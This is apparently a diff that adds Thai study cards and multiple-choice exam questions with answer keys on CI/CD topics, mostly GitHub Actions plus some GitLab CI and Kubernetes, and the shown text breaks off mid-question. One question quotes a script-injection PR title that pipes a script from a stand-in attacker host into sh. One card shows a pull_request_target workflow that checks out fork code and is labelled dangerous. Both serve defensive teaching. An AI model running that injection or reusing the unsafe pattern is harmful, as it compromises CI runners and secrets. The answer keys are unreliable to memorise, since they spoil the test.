@@ -67,6 +67,93 @@
       "tier": "advanced",
       "title": "DORA metrics",
       "body": "DORA วัดประสิทธิภาพการส่งมอบซอฟต์แวร์ด้วย 5 ตัวชี้วัด กลุ่ม throughput คือ change lead time (จาก commit ถึง production), deployment frequency และ failed deployment recovery time ส่วนกลุ่ม instability คือ change fail rate และ deployment rework rate (rework rate เพิ่มเข้ามาในปี 2024 ส่วน recovery time มาแทน MTTR ในปี 2023) งานวิจัยของ DORA พบว่าความเร็วกับความเสถียรไปด้วยกันได้ ทีมที่ดีมักทำได้ดีทั้งสองกลุ่ม ใช้ดูแนวโน้มของทีมเพื่อหาจุดปรับปรุง ไม่ใช่เอาไปจัดอันดับคนหรือทีม"
+    },
+    {
+      "tier": "must",
+      "title": "Matrix strategy: รันหลายชุดค่าใน job เดียว",
+      "body": "strategy.matrix สร้าง job หนึ่งตัวต่อหนึ่งชุดค่าที่ผสมกัน เช่น Node 22 กับ 24 บน ubuntu และ windows โดยไม่ต้อง copy job และอ้างค่าด้วย matrix.<ชื่อ> ใช้ include เพิ่มหรือเติมชุดค่า ใช้ exclude ตัดชุดค่า (ตรงบางส่วนก็ตัดได้ และ include ถูกประมวลผลหลัง exclude) กับดักที่พบบ่อยคือ fail-fast ซึ่งโดยปริยายเป็น true: พอมี job ในเมทริกซ์ล้มหนึ่งตัว GitHub จะยกเลิก job ที่กำลังรันและที่รอคิวทั้งหมด จึงเห็นผลไม่ครบ ถ้าอยากเห็นทุกชุดให้ตั้ง fail-fast: false และจำไว้ว่าเมทริกซ์สร้างได้สูงสุด 256 job ต่อ workflow run",
+      "code": "test:\n  runs-on: ${{ matrix.os }}\n  strategy:\n    fail-fast: false\n    matrix:\n      os: [ubuntu-latest, windows-latest]\n      node: [22, 24]\n      exclude:\n        - os: windows-latest\n          node: 22\n  steps:\n    - uses: actions/setup-node@v7\n      with:\n        node-version: ${{ matrix.node }}",
+      "exam": true,
+      "ref": "https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax#jobsjob_idstrategymatrix"
+    },
+    {
+      "tier": "must",
+      "title": "Job outputs: ส่งค่าจาก job หนึ่งไปอีก job",
+      "body": "ทุก job รันบน runner ของตัวเอง ค่าที่ step หนึ่งสร้างจึงไม่ข้ามไป job อื่นเอง ถ้าต้องส่งค่าข้อความ เช่น เลขเวอร์ชัน ให้ step (ที่มี id) เขียน name=value ลงไฟล์ที่ชี้โดย $GITHUB_OUTPUT แล้ว map เป็น outputs ของ job และให้ job ที่ needs อ่านผ่าน needs.<job>.outputs.<ชื่อ> (output มีขนาดสูงสุด 1 MB ต่อ job) กับดักคือลืมประกาศ outputs ที่ระดับ job เพราะ output ของ step ไม่ข้าม job ให้เอง และในเมทริกซ์ถ้า output ชื่อซ้ำกัน job ที่จบทีหลังจะทับค่า โดยลำดับการจบไม่รับประกัน",
+      "code": "jobs:\n  build:\n    runs-on: ubuntu-latest\n    outputs:\n      version: ${{ steps.ver.outputs.version }}\n    steps:\n      - id: ver\n        run: echo \"version=${GITHUB_SHA::7}\" >> \"$GITHUB_OUTPUT\"\n  deploy:\n    needs: build\n    runs-on: ubuntu-latest\n    steps:\n      - env:\n          VERSION: ${{ needs.build.outputs.version }}\n        run: echo \"deploying $VERSION\"",
+      "ref": "https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax#jobsjob_idoutputs"
+    },
+    {
+      "tier": "must",
+      "title": "Environments และ deployment protection rules",
+      "body": "environment คือชื่อเป้าหมายของการ deploy เช่น staging หรือ production ที่ผูกกฎและ secrets ไว้ job ระบุด้วย environment: production และ job ที่อ้างถึงต้องผ่านกฎของ environment นั้นก่อนจึงเริ่มรันหรือแตะ secrets ได้ กฎที่ใช้บ่อยคือ required reviewers (ระบุได้สูงสุด 6 คนหรือทีม อนุมัติเพียงคนเดียวก็พอ และเปิด prevent self-review ไม่ให้ผู้สั่ง deploy อนุมัติเองได้), wait timer และจำกัด branch หรือ tag ที่ deploy ได้ environment secrets จึงใช้แยก credential ของ production ออกจาก staging และ job จะอ่านค่าไม่ได้จนกว่าจะได้รับอนุมัติ (บาง rule ใน private repo ต้องใช้แผน GitHub ที่รองรับ)",
+      "code": "deploy:\n  needs: build\n  runs-on: ubuntu-latest\n  environment: production   # job นี้รอ reviewer อนุมัติก่อนเริ่ม\n  steps:\n    - run: ./deploy.sh\n      env:\n        DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}   # environment secret",
+      "exam": true,
+      "ref": "https://docs.github.com/en/actions/reference/workflows-and-actions/deployments-and-environments"
+    },
+    {
+      "tier": "must",
+      "title": "Script injection: อย่าฝัง expression ใน run",
+      "body": "expression แบบ ${{ }} ที่อยู่ใน run ถูกแทนด้วยข้อความจริงตอนสร้างสคริปต์ก่อนที่ shell จะรัน ถ้าค่านั้นมาจากคนนอก เช่น ชื่อ PR, ชื่อ branch หรือข้อความ comment ผู้โจมตีใส่เครื่องหมายคำพูดปิดแล้วต่อคำสั่งของตัวเองได้ วิธีที่เอกสารของ GitHub แนะนำสำหรับ inline script คือกำหนดค่าให้ env ของ step แล้วอ้างเป็นตัวแปรของ shell (ครอบด้วย double quote) ค่าจะถูกเก็บเป็น environment variable ไม่ปนเข้าไปในตัวสคริปต์ ส่วนการเปลี่ยนชนิดเครื่องหมายคำพูดไม่ช่วยอะไรโดยหลักการ เพราะ input ก็ปิดเครื่องหมายชนิดเดียวกันนั้นได้เหมือนกัน (เอกสารเน้นว่าอย่าให้ค่านั้นไปปนกับตัวสคริปต์)",
+      "code": "# ไม่ปลอดภัย: ชื่อ PR กลายเป็นส่วนหนึ่งของสคริปต์\n- run: echo \"${{ github.event.pull_request.title }}\"\n\n# ปลอดภัยกว่า: ส่งผ่าน env แล้วอ้างเป็นตัวแปร\n- env:\n    TITLE: ${{ github.event.pull_request.title }}\n  run: echo \"$TITLE\"",
+      "exam": true,
+      "ref": "https://docs.github.com/en/actions/reference/security/secure-use#use-an-intermediate-environment-variable"
+    },
+    {
+      "tier": "must",
+      "title": "Branch protection และ required status checks",
+      "body": "CI ที่ไม่ถูกบังคับก็เป็นแค่คำแนะนำ การตั้ง branch protection ให้ main ต้องผ่าน required status checks ก่อน merge จึงทำให้ pipeline เป็นประตูจริง สถานะที่ถือว่าผ่านคือ successful, skipped หรือ neutral เอกสารของ GitHub เตือนว่าชื่อ job ที่ใช้เป็น required check ต้องไม่ซ้ำกันข้ามทุก workflow เพราะชื่อซ้ำทำให้ผลก้ำกึ่งและอาจบล็อก PR และโดยปริยายกฎไม่บังคับกับ admin เว้นแต่เลือกให้ใช้กับ admin ด้วย จึงควรเปิดตัวเลือกนั้นถ้าไม่อยากให้ใครข้าม CI ได้",
+      "ref": "https://docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/managing-protected-branches/about-protected-branches"
+    },
+    {
+      "tier": "should",
+      "title": "Artifacts กับ cache ใช้ต่างกัน",
+      "body": "artifact คือไฟล์ที่ job สร้างไว้ เช่น binary, test report หรือ coverage เก็บไว้ดูหลัง run จบ หรือส่งต่อให้ job อื่นใน workflow เดียวกันด้วย actions/upload-artifact และ actions/download-artifact ส่วน cache คือไฟล์ที่ใช้ซ้ำข้าม run เพื่อเร่งความเร็ว เช่น dependency ที่ดาวน์โหลดมา สองอย่างนี้ใช้แทนกันไม่ได้ เพราะ job ต้องสร้างไฟล์ใหม่ได้เสมอเมื่อ cache หาย ตัวอย่างคือ dist/ ที่ build job ทำไว้เพื่อส่งให้ deploy job ต้องเป็น artifact ไม่ใช่ cache",
+      "code": "# job build\n- uses: actions/upload-artifact@v7\n  with:\n    name: dist\n    path: dist/\n\n# job deploy (needs: build)\n- uses: actions/download-artifact@v8\n  with:\n    name: dist\n    path: dist/",
+      "ref": "https://docs.github.com/en/actions/concepts/workflows-and-actions/workflow-artifacts"
+    },
+    {
+      "tier": "should",
+      "title": "concurrency: กัน deploy ซ้อนและยกเลิกงานเก่า",
+      "body": "concurrency.group ทำให้ job หรือ workflow ใน group เดียวกันรันได้ทีละงาน งานใหม่ที่เข้ามาระหว่างนั้นจะเป็น pending และโดยปริยายถ้ามี pending เดิมอยู่ มันจะถูกยกเลิกแล้วงานใหม่เข้ามาแทน ต้องใส่ cancel-in-progress: true จึงจะยกเลิกงานที่กำลังรันด้วย ซึ่งเหมาะกับ CI ของ PR ที่ผลของ commit เก่าไม่มีความหมายแล้ว แต่ไม่ควรใช้กับ deploy production เพราะอาจฆ่า deploy กลางคัน ชื่อ group ควรประกอบด้วย github.workflow และ github.ref เพราะ workflow ต่างกันที่ใช้ชื่อ group ตรงกันจะยกเลิกกันเอง",
+      "code": "concurrency:\n  group: ${{ github.workflow }}-${{ github.ref }}\n  cancel-in-progress: true",
+      "ref": "https://docs.github.com/en/actions/how-tos/write-workflows/choose-when-workflows-run/control-workflow-concurrency"
+    },
+    {
+      "tier": "should",
+      "title": "Reusable workflows: workflow_call และการส่ง secrets",
+      "body": "workflow ที่ประกาศ on: workflow_call ถูกเรียกจาก workflow อื่นได้ด้วย uses ที่ระดับ job เหมาะกับ pipeline มาตรฐานที่หลาย repo ใช้ร่วมกัน ค่าส่งผ่าน with (ตาม inputs ที่ประกาศไว้) และ secrets ต้องถูกส่งให้ชัดเจนด้วย secrets: ชื่อ หรือใช้ secrets: inherit เพื่อส่งทั้งหมด (ใช้ได้เมื่อ workflow ที่เรียกอยู่ใน organization หรือ enterprise เดียวกัน) โดย secrets ส่งต่อให้เฉพาะ workflow ที่ถูกเรียกโดยตรง ใน A เรียก B เรียก C นั้น C ได้เฉพาะที่ B ส่งให้ นอกจากนี้ซ้อนกันได้สูงสุด 10 ชั้น และใน workflow ที่ซ้อนกันสิทธิ์ของ GITHUB_TOKEN ต้องเท่าเดิมหรือจำกัดกว่าเท่านั้น",
+      "code": "# .github/workflows/ci-node.yml (reusable)\non:\n  workflow_call:\n    inputs:\n      node-version:\n        type: string\n        default: '24'\n\n# workflow ที่เรียกใช้\njobs:\n  ci:\n    uses: my-org/shared/.github/workflows/ci-node.yml@v1\n    with:\n      node-version: '22'\n    secrets: inherit",
+      "ref": "https://docs.github.com/en/actions/how-tos/reuse-automations/reuse-workflows"
+    },
+    {
+      "tier": "should",
+      "title": "GitLab CI: stages, needs และ rules",
+      "body": "ถ้าไม่ประกาศ stages ใน .gitlab-ci.yml GitLab ใช้ .pre, build, test, deploy, .post และ job ที่ไม่ระบุ stage จะอยู่ใน stage test job ใน stage เดียวกันรันขนานกัน และ stage ถัดไปเริ่มเมื่อ stage ก่อนหน้าสำเร็จครบ needs ทำให้ job ข้ามลำดับ stage ได้เป็น DAG เช่น needs: [] ให้ job เริ่มทันที ส่วน rules ถูกประเมินตามลำดับตอนสร้าง pipeline จนเจอข้อแรกที่ตรง และถ้าไม่มี rule ใดตรง job จะไม่ถูกเพิ่มเข้า pipeline เลย (ไม่ใช่แค่ถูกข้าม)",
+      "code": "stages: [test, build, deploy]\n\nlint:\n  stage: test\n  needs: []          # เริ่มทันที ไม่รอ stage ก่อนหน้า\n  script: npm run lint\n\ndeploy:\n  stage: deploy\n  script: ./deploy.sh\n  rules:\n    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH",
+      "exam": true,
+      "ref": "https://docs.gitlab.com/ci/yaml/#stages"
+    },
+    {
+      "tier": "advanced",
+      "title": "pull_request_target และ workflow_run: trigger ที่มีสิทธิ์สูง",
+      "body": "pull_request_target รันในบริบทของ default branch ของ repository ปลายทาง ไม่ใช่ merge commit ของ PR เหมือน pull_request จึงทำงานอย่าง label หรือ comment บน PR จาก fork ได้ แต่เอกสารเตือนว่าอย่าใช้ event นี้เพื่อ build หรือรันโค้ดจาก PR เพราะการรันโค้ดที่ไม่น่าไว้ใจในบริบทนี้อาจเปิดทางให้เข้าถึง secrets หรือสิทธิ์เขียน รวมถึง cache poisoning (รู้จักกันในชื่อ pwn request) workflow_run มีความเสี่ยงลักษณะเดียวกันเมื่อใช้ร่วมกับ checkout โค้ดที่ไม่น่าไว้ใจ ปัจจุบัน actions/checkout v7 ปฏิเสธการ checkout โค้ดจาก fork PR ภายใต้สอง trigger นี้โดยปริยาย ต้องตั้ง allow-unsafe-pr-checkout: true เองหลังประเมินความเสี่ยง ซึ่งก็คือการเปิดประตูที่ถูกปิดไว้ ส่วน pull_request จาก fork ไม่ได้ secrets (ยกเว้น GITHUB_TOKEN ที่อ่านได้อย่างเดียว) จึงเหมาะกับการ build และ test โค้ดของ PR",
+      "code": "# อันตราย: รันโค้ดของ PR ในบริบทที่มีสิทธิ์สูง\n# (checkout v7 จะปฏิเสธ fork PR ถ้าไม่ตั้ง allow-unsafe-pr-checkout)\non: pull_request_target\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v7\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n          allow-unsafe-pr-checkout: true\n      - run: npm ci && npm test",
+      "ref": "https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows#pull_request_target"
+    },
+    {
+      "tier": "advanced",
+      "title": "GitOps: ให้ agent ดึงและ reconcile สถานะที่ต้องการ",
+      "body": "OpenGitOps v1.0.0 นิยามหลักสี่ข้อ: ระบบมี desired state แบบ declarative, เก็บใน store ที่ versioned และ immutable พร้อมประวัติครบ (เช่น Git), software agent ดึง (pull) desired state มาเองโดยอัตโนมัติ และ agent สังเกตสถานะจริงแล้วพยายามทำให้ตรงกับที่ประกาศไว้อย่างต่อเนื่อง (reconcile) โดยทั่วไปต่างจาก push-based CD ที่ pipeline เป็นฝ่ายสั่ง apply เข้าไป (เป็นการเปรียบเทียบทั่วไป ไม่ใช่ข้อความในหน้าหลักการ) และเมื่อใช้ Git เป็น store การแก้ไขจึงเริ่มจาก commit หรือ PR ส่วนการแก้ของจริงด้วยมือ (drift) agent ที่ reconcile อยู่จะพยายามดึงกลับให้ตรงกับ desired state ซึ่งพฤติกรรมละเอียด เช่น ช่วงเวลา reconcile หรือการเปิด self-heal ขึ้นกับเครื่องมือและการตั้งค่า",
+      "ref": "https://opengitops.dev/"
+    },
+    {
+      "tier": "advanced",
+      "title": "Kubernetes RollingUpdate: maxSurge, maxUnavailable และ readiness probe",
+      "body": "Deployment แบบ RollingUpdate ลด ReplicaSet เก่าและเพิ่มอันใหม่ทีละส่วน โดย maxUnavailable (ค่าเริ่มต้น 25% ปัดลง) คือจำนวน Pod ที่ไม่พร้อมได้สูงสุดระหว่าง update และ maxSurge (ค่าเริ่มต้น 25% ปัดขึ้น) คือจำนวน Pod ที่สร้างเกินจำนวนที่ต้องการได้ ตั้งทั้งสองเป็น 0 ไม่ได้ ถ้าต้องการไม่ให้ capacity ลดเลยให้ใช้ maxUnavailable: 0 กับ maxSurge อย่างน้อย 1 ซึ่งต้องคู่กับ readiness probe เพราะตามเอกสาร probe ของ Kubernetes Pod ที่ readiness ยังไม่ผ่านจะไม่ได้รับ traffic ผ่าน Service และ rollout จะรอให้ Pod ใหม่พร้อมก่อนลด Pod เก่าต่อ ถ้ามีปัญหา kubectl rollout undo กลับ revision ก่อนหน้าได้ตราบที่ ReplicaSet เก่ายังอยู่ (revisionHistoryLimit ค่าเริ่มต้น 10)",
+      "code": "spec:\n  replicas: 4\n  strategy:\n    type: RollingUpdate\n    rollingUpdate:\n      maxUnavailable: 0\n      maxSurge: 1\n  template:\n    spec:\n      containers:\n        - name: api\n          image: registry.example.com/api:3f9a1c2\n          readinessProbe:\n            httpGet:\n              path: /healthz\n              port: 8080",
+      "exam": true,
+      "ref": "https://kubernetes.io/docs/concepts/workloads/controllers/deployment/#rolling-update-deployment"
     }
   ],
   "questions": [
@@ -181,51 +268,419 @@
       ],
       "answer": 1,
       "explain": "DORA ดู 5 ตัวชี้วัดร่วมกัน deploy บ่อยแต่ต้อง hotfix ตามบ่อยแปลว่า change fail rate และ deployment rework rate สูง ต้องปรับคุณภาพก่อนปล่อย การถอยไป deploy นาน ๆ ครั้งไม่ใช่คำตอบ เพราะงานวิจัยของ DORA พบว่าทีมที่ดีทำได้ทั้งเร็วและเสถียร และการเปลี่ยนแปลงก้อนใหญ่มักเสี่ยงกว่า"
+    },
+    {
+      "prompt": "ทีมใช้ matrix ทดสอบ Node 22 และ 24 บน ubuntu และ windows (รวม 4 job) ใน PR หนึ่ง job ของ windows + Node 22 ล้ม แล้วเห็นว่า job ที่เหลือถูก Cancelled ทั้งที่บางตัวยังรันไม่เสร็จ ทีมอยากเห็นผลของทุกชุดค่าแม้บางชุดจะล้ม ควรทำอย่างไร",
+      "code": "strategy:\n  matrix:\n    os: [ubuntu-latest, windows-latest]\n    node: [22, 24]",
+      "options": [
+        "เพิ่ม needs ให้ทุกชุดค่ารอกันเอง เพื่อไม่ให้ job ถูกยกเลิกกลางคัน",
+        "ลดชุดค่าใน matrix ให้เหลือสองชุด เพื่อให้ล้มพร้อมกันและไม่ถูกยกเลิก",
+        "ตั้ง strategy.fail-fast: false เพราะโดยปริยายเป็น true และจะยกเลิก job ที่เหลือเมื่อมีตัวล้ม",
+        "ย้ายไปใช้ self-hosted runner เพราะ runner ของ GitHub ยกเลิก job ที่เหลือให้เองทุกครั้งที่มี job ใดล้ม"
+      ],
+      "answer": 2,
+      "explain": "fail-fast มีค่าโดยปริยายเป็น true: เมื่อ job ในเมทริกซ์ล้ม GitHub จะยกเลิก job ที่กำลังรันและที่รอคิวทั้งหมด ตั้งเป็น false จึงจะได้ผลครบทุกชุด ส่วน needs ใช้กำหนดลำดับพึ่งพาระหว่าง job ไม่เกี่ยวกับการยกเลิก"
+    },
+    {
+      "prompt": "workflow ด้านล่างพิมพ์ว่า \"deploying \" โดยไม่มีเลขเวอร์ชัน ทั้งที่ step ใน build เขียนค่าลง $GITHUB_OUTPUT สำเร็จ สาเหตุคืออะไร",
+      "code": "jobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - id: ver\n        run: echo \"version=1.4.2\" >> \"$GITHUB_OUTPUT\"\n  deploy:\n    needs: build\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"deploying ${{ needs.build.outputs.version }}\"",
+      "options": [
+        "job build ไม่ได้ประกาศ outputs ระดับ job เพื่อ map ค่าจาก steps.ver",
+        "ต้องเขียนค่าลง $GITHUB_ENV แทน $GITHUB_OUTPUT ไฟล์นี้ใช้ได้เฉพาะภายใน step เดียว",
+        "needs.<job>.outputs อ่านได้เฉพาะ job ที่อยู่ติดกันในไฟล์ ซึ่งในที่นี้ไม่ได้อยู่ติดกัน",
+        "output ส่งข้ามเครื่อง runner ไม่ได้ ต้องใช้ artifact เสมอ แม้จะเป็นข้อความสั้น ๆ"
+      ],
+      "answer": 0,
+      "explain": "output ของ step ไม่ข้าม job เอง ต้องมี outputs: version: ${{ steps.ver.outputs.version }} ที่ระดับ job แล้ว job ที่ needs จึงอ่านผ่าน needs.build.outputs.version ได้ ส่วน artifact ใช้กับไฟล์ ไม่จำเป็นสำหรับค่าข้อความสั้น ๆ"
+    },
+    {
+      "prompt": "job build สร้างโฟลเดอร์ dist/ แล้ว job deploy (needs: build) ซึ่งรันบน runner อีกเครื่อง ขึ้น error ว่าไม่พบ dist/ ทีมควรแก้อย่างไรให้ถูกหลัก",
+      "options": [
+        "ใช้ actions/cache ด้วย key จาก lockfile เพื่อเก็บ dist/ ไว้ให้ deploy job",
+        "ใส่ needs: build ซ้ำอีกครั้งที่ step ของ deploy เพื่อให้เห็นไฟล์ของ build",
+        "ส่งเนื้อไฟล์ทุกไฟล์ใน dist/ ผ่าน job outputs ทีละไฟล์ แล้วเขียนกลับเป็นไฟล์ใน deploy job",
+        "ให้ build อัปโหลด dist/ ด้วย upload-artifact แล้ว deploy ดาวน์โหลดด้วย download-artifact"
+      ],
+      "answer": 3,
+      "explain": "artifact ออกแบบมาเพื่อส่งไฟล์ระหว่าง job ใน workflow เดียวกัน ส่วน cache ใช้แทนไม่ได้ เพราะ job ต้องทำงานได้แม้ cache หาย needs กำหนดแค่ลำดับ ไม่ได้ทำให้สองเครื่องใช้ไฟล์ร่วมกัน และ outputs เหมาะกับค่าข้อความสั้น ๆ ไม่ใช่ไฟล์"
+    },
+    {
+      "prompt": "ทีมสร้าง environment ชื่อ production กำหนด required reviewers 1 คน และเก็บ DEPLOY_TOKEN เป็น environment secret ของ production job deploy ระบุ environment: production เมื่อมีการ push เข้า main จะเกิดอะไรกับ job deploy",
+      "options": [
+        "job รันทันที แต่ DEPLOY_TOKEN จะเป็นค่าว่างไปจนกว่า reviewer จะกดอนุมัติ",
+        "job รอ reviewer อนุมัติก่อนเริ่ม และยังอ่าน DEPLOY_TOKEN ไม่ได้จนกว่าจะอนุมัติ",
+        "job รันได้จนถึง step ที่ใช้ secret แล้วจึงหยุดรออนุมัติเฉพาะ step นั้น",
+        "ทุก job ในรอบนั้นหยุดรอ รวมถึง job build ที่ไม่ได้อ้าง environment"
+      ],
+      "answer": 1,
+      "explain": "job ที่อ้าง environment ต้องผ่าน protection rules ก่อนเริ่มรันหรือเข้าถึง secrets ของ environment นั้น การรอเกิดที่ระดับ job ไม่ใช่ระดับ step และกระทบเฉพาะ job ที่อ้าง environment ไม่ใช่ทั้ง workflow"
+    },
+    {
+      "prompt": "องค์กรอยากให้ deploy production ต้องมีคนที่ไม่ใช่ผู้กด push เป็นผู้อนุมัติเสมอ แม้ผู้กด push จะอยู่ในรายชื่อ required reviewers ด้วย ควรตั้งค่าอะไรบน environment",
+      "options": [
+        "ตั้ง wait timer ให้นานพอ ผู้กด push จะได้ไม่มีโอกาสอนุมัติทัน",
+        "จำกัด deployment branches ให้เหลือเฉพาะ protected branches เพื่อให้มีแต่ branch ที่ผ่านการตรวจสอบเท่านั้นที่ deploy ได้",
+        "เปิด prevent self-review เพื่อไม่ให้ผู้ที่สั่ง deploy อนุมัติ deployment ของตัวเอง",
+        "เพิ่ม required reviewers เป็น 6 คน เพราะ job จะเริ่มได้ต่อเมื่อ reviewer อนุมัติครบทุกคน"
+      ],
+      "answer": 2,
+      "explain": "prevent self-review ห้ามผู้ที่เริ่ม deployment อนุมัติเองแม้เป็น reviewer ส่วน wait timer เพียงหน่วงเวลา และ deployment branches จำกัดว่า branch ใดขึ้น environment ได้ ไม่ได้ควบคุมว่าใครอนุมัติ การเพิ่มจำนวน reviewer ก็ไม่ช่วย เพราะอนุมัติเพียงคนเดียวก็พอ และผู้กด push ที่อยู่ในรายชื่อยังอนุมัติเองได้"
+    },
+    {
+      "prompt": "workflow ตรวจชื่อ PR ด้านล่างทำงานเมื่อมีคนเปิด PR ผู้ร่วมพัฒนาจากภายนอกตั้งชื่อ PR เป็น x\"; curl https://evil.example/s.sh | sh; echo \" ผลที่เกิดขึ้นและวิธีแก้ที่ถูกต้องคืออะไร",
+      "code": "on: pull_request\njobs:\n  check:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"Title: ${{ github.event.pull_request.title }}\"",
+      "options": [
+        "GitHub escape อักขระพิเศษให้อัตโนมัติ จึงปลอดภัยอยู่แล้ว ไม่ต้องแก้",
+        "ปลอดภัย เพราะ PR จาก fork ไม่ได้รับ secrets จึงสร้างความเสียหายไม่ได้เลย",
+        "ควรเปลี่ยน trigger เป็น pull_request_target เพื่อให้ workflow รันในบริบทที่เชื่อถือได้ของ repository หลักแทน",
+        "ค่าถูกแทนลงในสคริปต์ก่อนรัน คำสั่งที่แทรกเข้ามาจึงรันได้ ควรส่งผ่าน env แล้วอ้าง \"$TITLE\""
+      ],
+      "answer": 3,
+      "explain": "expression ใน run ถูกแทนด้วยข้อความจริงก่อนที่ shell จะรัน คำสั่งที่แทรกมาจึงทำงานบน runner ได้ การส่งค่าผ่าน env ทำให้ค่าเป็นแค่ตัวแปร ไม่ใช่ส่วนของสคริปต์ การที่ fork ไม่ได้ secrets ลดความเสียหายแต่ไม่ได้ป้องกันการรันคำสั่ง และ pull_request_target มีสิทธิ์สูงกว่าจึงยิ่งเสี่ยง"
+    },
+    {
+      "prompt": "ใน push เข้า main ทีมพบว่า job deploy ไม่รันเลย ทั้งที่ test ผ่าน สาเหตุคือ lint ถูกกำหนดให้รันเฉพาะ PR (จึงถูกข้ามบน push) แล้ว deploy ระบุ needs ทั้งสอง ควรแก้อย่างไร",
+      "code": "jobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm test\n  lint:\n    if: github.event_name == 'pull_request'\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm run lint\n  deploy:\n    needs: [test, lint]\n    runs-on: ubuntu-latest\n    steps:\n      - run: ./deploy.sh",
+      "options": [
+        "เอา test ออกจาก needs เพราะ deploy ควรรอ lint เพียงอย่างเดียว แล้วย้ายขั้น test ไปรันหลัง deploy",
+        "ใส่ continue-on-error: true ให้ deploy เพื่อให้ job รันต่อได้แม้ dependency ล้มหรือถูกข้าม",
+        "ใส่ if: ${{ !failure() && !cancelled() }} ให้ deploy รันเมื่อ dependency ไม่ล้ม แม้บางตัวถูกข้าม",
+        "ไม่ต้องแก้ เพราะ job ที่ถูกข้ามนับเป็นผ่านเสมอ deploy ต้องรันอยู่แล้ว"
+      ],
+      "answer": 2,
+      "explain": "ถ้า job ที่ needs ถูกข้ามหรือล้ม job ที่พึ่งมันจะถูกข้ามตามไป เว้นแต่ใช้เงื่อนไข เช่น status function ที่ทำให้ job ทำงานต่อ !failure() && !cancelled() จะยังข้าม deploy เมื่อ test ล้ม แต่ไม่ถูกบล็อกเพียงเพราะ lint ถูกข้าม ส่วน continue-on-error ไม่เกี่ยวกับการข้ามของ dependency"
+    },
+    {
+      "prompt": "repository ตั้ง required status check ชื่อ test ไว้บน main workflow ci.yml ที่สร้าง check นี้ถูกตั้ง on: pull_request ด้วย paths: [src/**] PR ที่แก้เฉพาะ README.md ค้างอยู่สถานะรอผลของ test และ merge ไม่ได้เลย เพราะอะไร",
+      "options": [
+        "GitHub ต้องการให้ admin ของ repository กด bypass ทุกครั้งที่ PR ไม่แตะโค้ดในโฟลเดอร์ src",
+        "workflow ถูกข้ามด้วย paths filter จึงไม่เคยรายงาน check นี้ ทำให้ค้าง Pending และ merge ไม่ได้",
+        "required status check ต้องตั้งเป็นแบบ strict ใน branch protection ก่อน PR ที่ไม่แตะโค้ดจึงจะผ่านได้",
+        "สถานะ skipped ไม่ถือว่าผ่าน required check จึงต้องให้ทุก job รันจริงเสมอ"
+      ],
+      "answer": 1,
+      "explain": "เมื่อ workflow ถูกข้ามด้วย paths หรือ branch filter check ของมันจะค้างเป็น Pending และ PR ที่ต้องการ check นั้นจะ merge ไม่ได้ ทางออกคือให้ workflow รันทุก PR แล้วข้าม job ด้วย if ซึ่งสถานะ skipped ถือว่าผ่าน required check ได้ (ข้อสุดท้ายจึงผิด)"
+    },
+    {
+      "prompt": "ทีมตั้ง concurrency ให้ deploy production แล้วพบว่าเมื่อมีสอง push ห่างกันไม่กี่นาที deploy รอบแรกซึ่งกำลัง migrate ฐานข้อมูลอยู่ถูก Cancelled กลางคัน ควรแก้อย่างไร",
+      "code": "concurrency:\n  group: production\n  cancel-in-progress: true",
+      "options": [
+        "ลบ concurrency ทิ้งทั้งหมด เพื่อให้ deploy ทั้งสองรอบรันขนานกันโดยไม่ยกเลิกใคร",
+        "เปลี่ยน group ให้รวม github.sha เพื่อให้ทุก commit มี group ของตัวเองและไม่ยกเลิกกัน",
+        "เพิ่ม timeout-minutes ให้ยาวขึ้น เพราะ deploy ถูกยกเลิกจากการหมดเวลา",
+        "เอา cancel-in-progress: true ออก เพื่อให้รอบใหม่รอเป็น pending แทนการฆ่ารอบที่กำลังรัน"
+      ],
+      "answer": 3,
+      "explain": "cancel-in-progress: true ยกเลิกงานที่กำลังรันใน group เดียวกัน เมื่อเอาออก งานใหม่จะรอเป็น pending จนรอบเดิมจบ (โดยปริยายถ้ามี pending เดิมอยู่จะถูกแทนที่ด้วยตัวใหม่) การเปลี่ยน group เป็นราย commit หรือลบ concurrency ทำให้ deploy ซ้อนกันได้ ซึ่งอันตรายกว่าเมื่อมี migration"
+    },
+    {
+      "prompt": "หลังเพิ่ม concurrency ให้ workflow CI ทีมสังเกตว่าการ push เข้า PR ก้อนหนึ่งทำให้ CI ของ PR อีกก้อนที่ไม่เกี่ยวกันถูกยกเลิกไปด้วย สาเหตุคืออะไร",
+      "code": "concurrency:\n  group: ci\n  cancel-in-progress: true",
+      "options": [
+        "ทุก PR ใช้ group ชื่อ ci เหมือนกัน ควรประกอบชื่อ group จาก github.workflow และ github.ref",
+        "cancel-in-progress ควรเป็น false เพราะ true ใช้ได้กับ push เข้า main เท่านั้น",
+        "concurrency ระดับ workflow ใช้ไม่ได้กับ event pull_request ต้องย้ายไปไว้ที่ระดับ step แทน",
+        "GitHub จำกัดให้รันได้ทีละ workflow ต่อ repository เป็นพฤติกรรมปกติที่แก้ไม่ได้"
+      ],
+      "answer": 0,
+      "explain": "group เป็นสตริงตายตัว ทุก run ของ workflow จึงอยู่ใน group เดียวกันและยกเลิกกันเอง การใส่ github.ref ทำให้แต่ละ branch หรือ PR มี group ของตัวเอง ส่วนการเปลี่ยน cancel-in-progress เป็น false จะทำให้รอคิวกันแทน ซึ่งยังไม่แก้ปัญหาว่าทุก PR ใช้ group เดียวกัน"
+    },
+    {
+      "prompt": "ทีม platform สร้าง reusable workflow publish.yml ที่ใช้ secrets.NPM_TOKEN ทีมแอปเรียกด้วย uses ... @v1 ตามตัวอย่างด้านล่าง แต่ publish ล้มเพราะ token ว่าง ควรแก้ที่ใด",
+      "code": "jobs:\n  publish:\n    uses: my-org/shared/.github/workflows/publish.yml@v1\n    with:\n      package: web",
+      "options": [
+        "ต้องก๊อปปี้ NPM_TOKEN ไปเก็บเป็น secret ในทุก repo ที่เป็นเจ้าของ reusable workflow",
